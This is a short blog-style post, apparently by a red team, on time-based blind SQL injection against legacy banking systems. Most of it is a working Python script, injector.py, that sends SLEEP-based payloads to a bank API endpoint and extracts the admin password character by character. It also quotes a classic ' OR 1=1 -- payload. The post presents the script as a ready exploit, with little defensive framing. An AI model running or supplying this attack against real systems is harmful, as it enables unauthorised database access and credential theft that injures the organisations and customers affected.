---
title: "Legacy SQLi: Automating Blind Injection"
date: "2025-11-10"
tags: ["Vectors", "Red Team", "Exploit"]
---

Modern WAFs often catch standard `' OR 1=1 --` payloads. However, in legacy banking systems, **Time-Based Blind SQL Injection** remains a potent vector.

We encountered an endpoint that didn't return errors but delayed the response when a specific condition was true.

### The Methodology

By injecting a sleep command, we can ask the database true/false questions. If it sleeps, the character matches.

<CodeWindow title="injector.py" lang="PYTHON">
{`import requests
import time

url = "https://target-bank.local/api/user"
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for i in range(1, 16): # Assume 15 char password
    for char in charset:
        payload = f"' AND IF(SUBSTRING(password,{i},1)='{char}',SLEEP(2),0) -- "
        
        start = time.time()
        r = requests.get(url + "?id=1" + payload)
        end = time.time()
        
        if (end - start) > 2:
            password += char
            print(f"[+] Found char: {char}")
            break`}
</CodeWindow>

This script extracts the admin password byte-by-byte, bypassing the frontend completely.